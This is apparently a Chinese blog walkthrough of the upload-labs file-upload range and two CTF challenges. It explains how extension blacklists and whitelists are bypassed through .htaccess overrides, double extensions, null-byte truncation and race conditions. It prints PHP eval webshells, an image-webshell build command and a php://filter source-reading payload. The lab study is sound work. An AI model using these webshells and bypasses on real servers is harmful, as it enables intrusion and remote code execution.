+<p>这些后缀名都可以被当做php文件执行。符合的后缀包括 php、php3、php4、php5、phtml、pht等，有时候需要挨个进行尝试</p>
+<p>如同场景一进行修改后缀操作，不同的是这里不需要改包，通过burpsuit获得上传文件路径即可，直接用中国菜刀进行连接，因为上面的后缀修改后都可以解析成相应的文件（phtml-&gt;php）<br>此处将文件后缀名进行修改即可。</p>
+<hr>
+<p><strong>场景四</strong></p>
+<p>有两种思路。</p>
+<p>1：不能上传php，但能上传php.jpg,php.asd，说明是黑名单限制，但是场景三中方法如：php3,phtml都被限制了，查看提示几乎所有可以绕过的后缀名都被限制了，但是没有禁止.htaccess，可以先上传一个.htaccess覆写后让所有文件解析为php，然后再上传一个图片马</p>
+<blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</blockquote>
+<pre><code>//.htaccess  修改文件
+SetHandler application/x-httpd-php
+</code></pre>
+<p>先上传文件.htaccess然后再上传图片格式的一句话木马，之后直接用中国菜刀连接即可。原因：所有图片信息再上面文件的配置下都会解析成php文件。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586105.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586106.png" alt="Sample"></p>
+<p>2：后缀名冗余(未知拓展名绕过)绕过，例如修改成one.php.aaa、one.php.xxxx等。然后直接使用中国菜刀连接。</p>
+<p>原理：本质为apache解析漏洞。apache中的主配置文件httpd.conf中存在DefaultType用于告诉apache该如何处理未知扩展名的文件，比如something.xxx这样的文件，扩展名是xxx，这肯定不是一个正常的网页或脚本文件，这个参数就是告诉apache该怎么处理这种未知扩展名的文件。</p>
+<p>参数DefaultType的默认值是“text&#x2F;plain”，也就是遇到未知扩展名的文件，就把它当作普通的txt文本或html文件来处理。文件内容为php代码的未知扩展名文件来说也是解析成文本对于something.php.xxx的多扩展名的文件，那么就会被以module方式运行php的apache解析，因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586117.png" alt="Sample"></p>
+<p><strong>未知拓展名漏洞防御解决</strong></p>
+<blockquote>
+<blockquote>
+<p>解决方案一</p>
+</blockquote>
+<p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p>
+<p>&lt;FilesMatch “.(php.|php3.|php4.|php5.)”&gt;<br>Order Deny,Allow<br>Deny from all</p>
+<p>解决方案二</p>
+<p>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：</p>
+<p>$filename &#x3D; str_replace(’.’, ‘_’, $filename);</p>
+</blockquote>
+<hr>
+<p><strong>场景五\场景六</strong></p>
+<p>使用场景四中的增加后缀冗余实现绕过。</p>
+<hr>
+<p><strong>场景七</strong></p>
+<p>3个思路</p>
+<p>1.文件“.”后增加空格。两图</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586118.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-16798388586119.png" alt="Sample"></p>
+<p>2.如场景四，采用后缀名冗余，即使用one.php.xxxx类似的文件名或者改包为这样的文件名绕过。</p>
+<p>3.在文件名后加一个”.”，例如one.php.但是我实际操作的时候需要加上一个空格才会成功。</p>
+<hr>
+<p><strong>场景八</strong></p>
+<p>很明显，没有过滤尾部”.”，这样burpsuit在one.php后面加上一个点绕过黑名单检查，并且能被php解析。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861110.png" alt="Sample"></p>
+<hr>
+<p><strong>场景九</strong></p>
+<ol>
+<li>利用上述方法中的第7点windows NTFS文件系统特性绕过。传上one.php，burpsuit改包，增加后缀::$DATA即可上传并获得上传路径。</li>
+<li>冗余后缀名</li>
+</ol>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861111.png" alt="Sample"></p>
+<hr>
+<p><strong>场景十</strong></p>
+<p>冗余后缀名。。。。（真好用，大部分黑名单都可以过，更说明黑名单是很不安全的）</p>
+<hr>
+<p><strong>场景十一</strong></p>
+<p>这个上传发现什么都可以传，但是其后缀被修改了，无法正常解析。因为下面这句新增的控制语句：</p>
+<pre><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+</code></pre>
+<p>说明只要出现黑名单里面的字样都会被替换成空格。有什么办法绕过呢？这个就像脑筋急转弯一样。</p>
+<p>我们不妨构造类似pphphp这种字段的后缀，这里有个地方可以思考，那就是构造这种模式的字符串是按照从前往后替换还是从前往后替换呢？也就是pphphp、phphpp是否能行？都行，还是那个行那个不行。这个可以动手尝试一下</p>
+<blockquote>
+<p>pphphp(php) phphpp(hpp)</p>
+</blockquote>
+<hr>
+<p><strong>场景十二</strong></p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &#39;上传出错！&#39;;
+        &#125;
+    &#125; else&#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>截断条件：<br>php版本小于5.3.4 详情关注CVE-2006-7243<br>php的magic_quotes_gpc为OFF状态</p>
+</blockquote>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861112.png" alt="Sample"></p>
+<p>做题之前先要把网站中的php.ini中的安全设置修改一下。</p>
+<blockquote>
+<p>php.ini文件里的magic_quotes_gpc设成了off，那么PHP就不会在敏感字符前加上反斜杠（\）</p>
+</blockquote>
+<p>通过 上面的场景，黑名单虽然对很多的文件上传都做了限制，规定那些不能上传，但是总是有一些其他的方法可以实现绕过，所以黑名单是相对于白名单来说安全级别很低的。</p>
+<p>这个场景是一个白名单。并且文件名是拼接而成。</p>
+<pre><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+</code></pre>
+<p>可以通过截断上传（0x00，%00，&#x2F;00 ）实现。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861113.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861114.png" alt="Sample"></p>
+<hr>
+<p><strong>场景十三</strong></p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &quot;上传失败&quot;;
+        &#125;
+    &#125; else &#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>可以看到文件路径中的$_GET[‘save_path’]变成了 $_POST[‘save_path’]。这又会造成什么区别呢？</p>
+<p><strong>post不会像get对%00进行自动解码</strong></p>
+<p>也就是说我们不能直接在包中直接加入截断字符了需要手动进行url编码处理。</p>
+</blockquote>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861115.png" alt="Sample"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861116.png" alt="Sample"></p>
+<p>这里上传路径后加一个A是为了方便寻找我们需要修改的地方，也可以不加。</p>
+<p>成功上传图片马。</p>
+<hr>
+<p><strong>场景十四</strong></p>
+<p>这题是上传图片马，但是想要利用图片马还需要结合文件包含漏洞，所以本题只需要上传三种图片格式的文件码就行了。</p>
+<p>制作图片马方法：</p>
+<pre><code>copy normal.jpg /b + shell.php /a webshell.jpg
+</code></pre>
+<p>直接通过抓包改包也可以直接上传只修改了后缀的一句话木马php文件。</p>
+<hr>
+<p><strong>场景十五</strong></p>
+<p>通过getimagesize()函数来实现对文件类型的识别判断。也就是说用burpsuit改包的方法操作就复杂了，直接合成一张木马图上传即可(与十四相同)</p>
+<hr>
+<p><strong>场景十六</strong></p>
+<p>通过函数exif_imagetype()函数获得图片文件的类型，从而实现文件白名单的过滤操作。不能抓包改包实现，依旧使用图片马合成。</p>
+<hr>
+<p><strong>场景十七</strong></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861117.png" alt="Sample"></p>
+<p>要通过二次渲染来上传图片文件，所以普通的图片马不能顺利上传，需要是使用二次渲染绕过（见上文知识点），制作后和前面场景一样直接上传图片即可完成。</p>
+<hr>
+<p><strong>场景十八</strong></p>
+<p>这是一个条件竞争的场景</p>
+<pre><code>$is_upload = false;
+$msg = null;
+
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file))&#123;
+        if(in_array($file_ext,$ext_arr))&#123;
+             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        &#125;else&#123;
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        &#125;
+    &#125;else&#123;
+        $msg = &#39;上传出错！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除修改名称后的文件，这里可以通过条件竞争的方式在unlink之前，访问webshell。<br>首先在burp中不断发送上传webshell的数据包即可。（参考上述知识点9条件竞争）</p>
+<p>为什么可以这样操作呢？之前的场景为什么不行呢？我们可以仔细看到这里的代码是不一样的构造。</p>
+<pre><code>$is_upload = false;
+$msg = null;
+
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file))&#123;
+        if(in_array($file_ext,$ext_arr))&#123;
+             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        &#125;else&#123;
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        &#125;
+    &#125;else&#123;
+        $msg = &#39;上传出错！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>其实这个代码都没啥大问题，执行下来都是OK的，但是这里是这样操作的，先通过move_uploaded_file把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重是重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致被绕过防护。下面是我随便找的之前的某一关，很明显看到之前代码是先改名，再移动保存。所以可以用条件竞争打他个措手不及，使得文件保存了但是没能及时处理。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861218.png" alt="在这里插入图片描述"></p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861219.png" alt="Sample"></p>
+<hr>
+<p><strong>场景十九</strong></p>
+<pre><code>&lt;li id=&quot;show_code&quot;&gt;
+    &lt;h3&gt;index.php代码&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;line-numbers language-php&quot;&gt;//index.php
+$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;]))
+&#123;
+    require_once(&quot;./myupload.php&quot;);
+    $imgFileName =time();
+    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);
+    $status_code = $u-&gt;upload(UPLOAD_PATH);
+    switch ($status_code) &#123;
+        case 1:
+            $is_upload = true;
+            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
+            break;
+        case 2:
+            $msg = &#39;文件已经被上传，但没有重命名。&#39;;
+            break; 
+        case -1:
+            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;
+            break; 
+        case -2:
+            $msg = &#39;上传失败，上传目录不可写。&#39;;
+            break; 
+        case -3:
+            $msg = &#39;上传失败，无法上传该类型文件。&#39;;
+            break; 
+        case -4:
+            $msg = &#39;上传失败，上传的文件过大。&#39;;
+            break; 
+        case -5:
+            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;
+            break; 
+        case -6:
+            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;
+            break;      
+        default:
+            $msg = &#39;未知错误！&#39;;
+            break;
+    &#125;
+&#125;
+
+//myupload.php
+class MyUpload&#123;
+......
+......
+...... 
+  var $cls_arr_ext_accepted = array(
+      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
+      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );
+
+......
+......
+......  
+  /** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **/
+  function upload( $dir )&#123;
+    
+    $ret = $this-&gt;isUploadedFile();
+    
+    if( $ret != 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;setDir( $dir );
+    if( $ret != 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;checkExtension();
+    if( $ret != 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;checkSize();
+    if( $ret != 1 )&#123;
+      return $this-&gt;resultUpload( $ret );    
+    &#125;
+    
+    // if flag to check if the file exists is set to 1
+    
+    if( $this-&gt;cls_file_exists == 1 )&#123;
+      
+      $ret = $this-&gt;checkFileExists();
+      if( $ret != 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+      &#125;
+    &#125;
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this-&gt;move();
+    if( $ret != 1 )&#123;
+      return $this-&gt;resultUpload( $ret );    
+    &#125;
+
+    // check if we need to rename the file
+
+    if( $this-&gt;cls_rename_file == 1 )&#123;
+      $ret = $this-&gt;renameFile();
+      if( $ret != 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+      &#125;
+    &#125;
+    
+    // if we are here, everything worked as planned :)
+
+    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+  
+  &#125;
+......
+......
+...... 
+&#125;;
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+</code></pre>
+<blockquote>
+<p>根据apache的后缀名识别漏洞：从右往左依次识别后缀，遇到不能识别的后缀名便跳过 ，因此可以文件名改为</p>
+<p>1.php.7z,然后利用bs 快速发包，</p>
+<p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，因为move在rename之前，move操作进行了一次文件保存，然后rename进行了一次更改文件名，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p>
+</blockquote>
+<p>所以本题相对上题是差不多的，只不过多了一部操作而已：增加Apache的解析识别漏洞（后缀冗余）</p>
+<blockquote>
+<p>（1）利用Apache 的漏洞，将webshell 脚本文件名改为1.php.7z （白名单中 有.7z 这个apache 不能识别的后缀，所以用.7z)</p>
+<p>然后利用bs 去不断快速发包，实现条件竞争，进而保留了脚本名，使apache 将其识别为1.php</p>
+<p>（2）单纯利用 条件竞争，利用bs 去不断快速发包，实现条件竞争，进而保留了图片马的文件名，成功绕过</p>
+</blockquote>
+<hr>
+<p><strong>场景二十</strong></p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST[&#39;save_name&#39;];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123; 
+                $is_upload = true;
+            &#125;else&#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125;else&#123;
+            $msg = &#39;禁止保存为该类型文件！&#39;;
+        &#125;
+
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>是个黑名单的限制</p>
+<ol>
+<li>看了一些黑名单，发现程序中没有大小写统一，后缀用大小写绕过。one.phP,成功上传。。。。可能是非预期解，要不然为什么放低二十关，黑名单真的不安全。。一不小心就漏了什么。</li>
+<li>也是一个文件名路径拼接的问题，可以用场景十二中的字符串截断来实现绕过（0x00、%00）。</li>
+<li>递归删除文件名最后的&#x2F;.导致绕过了后缀名检测,在bs中将文件名改为：1.php&#x2F;. 成功绕过。</li>
+</ol>
+<hr>
+<p><strong>场景二十一</strong></p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
+    //检查MIME
+    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
+    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    &#125;else&#123;
+        //检查文件名
+        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
+        if (!is_array($file)) &#123;
+            $file = explode(&#39;.&#39;, strtolower($file));
+        &#125;
+
+        $ext = end($file);
+        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+        if (!in_array($ext, $allow_suffix)) &#123;
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        &#125;else&#123;
+            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &quot;文件上传失败！&quot;;
+            &#125;
+        &#125;
+    &#125;
+&#125;else&#123;
+    $msg = &quot;请选择要上传的文件！&quot;;
+&#125;
+</code></pre>
+<p>end函数取所post参数数组中的最后一个值，$ file_name &#x3D; reset($ file) . ‘.’ . $ file[count($ file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$ file[count($ file) - 1]就为空，$ file_name最终就为reset($ file)即$ file[0]，就可以绕过判断。</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861220.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>就此该靶场二十一个关卡就已经全部完成了。相比你对整个文件上传有了大概了理解，还是建议下载靶场自己进行实践操作才能对知识有很好的吸收。</p>
+<hr>
+<hr>
+<h3 id="CTF实战-知识补充"><a href="#CTF实战-知识补充" class="headerlink" title="CTF实战-知识补充"></a>CTF实战-知识补充</h3><p>下面两题是CTF实例题目，并且知识点是上面没有包含的，在这补充，并且作为一个巩固练习。</p>
+<hr>
+<h4 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h4><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32785/">题目链接</a></p>
+<p>1.先改文件名，无效，不是前端校验。</p>
+<p>2.再改Content-Type，无效。</p>
+<p>3.有因为限制是图片上传，所以肯定是图片马了。制作一个图片马。</p>
+<pre><code>&lt;?php
+@eval($_POST[&#39;cmd&#39;]);
+?&gt;
+</code></pre>
+<p>4.上传成功。尝试连接？发现奇怪后缀~~</p>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861221.png" alt="在这里插入图片描述"><br>5.尝试截断。打开发现。。。不让操作。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861222.png" alt="在这里插入图片描述"><br>6.可能是php一句话的什么被过滤了，换用：</p>
+<pre><code>&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;cmd&#39;])&lt;/script&gt;
+</code></pre>
+<p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861223.png" alt="在这里插入图片描述"><br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861224.png" alt="在这里插入图片描述"><br>7.重复操作，得到flag！</p>
+<hr>
+<h4 id="bugku-ctf之文件上传2"><a href="#bugku-ctf之文件上传2" class="headerlink" title="bugku ctf之文件上传2"></a>bugku ctf之文件上传2</h4><p>湘湖杯比赛题，环境目前没找到，在很多安全题库的平台应该有，我没有去翻，先看两种思路。</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bf45138d4e13">https://www.jianshu.com/p/bf45138d4e13</a> <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/59730b290120">https://www.jianshu.com/p/59730b290120</a></p>
+</blockquote>
+<p>1.打开网站，是一个上传文件的网页，那我们先按照要求上传png文件试试，上传图片说打不开图片，陷入迷茫。那应该不是靠一句话菜刀，因为根本加载不出来，我觉得不可能没有php代码，于是在op后面构造</p>
+<p>op&#x3D;index.php 提示我们不存在这样的页面 但事实是存在的</p>
+<p>op&#x3D;index 没有出现提示 但页面是空的</p>
+<p>op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</p>
+<p>结果得到下面代码</p>
+<pre><code>&lt;?php
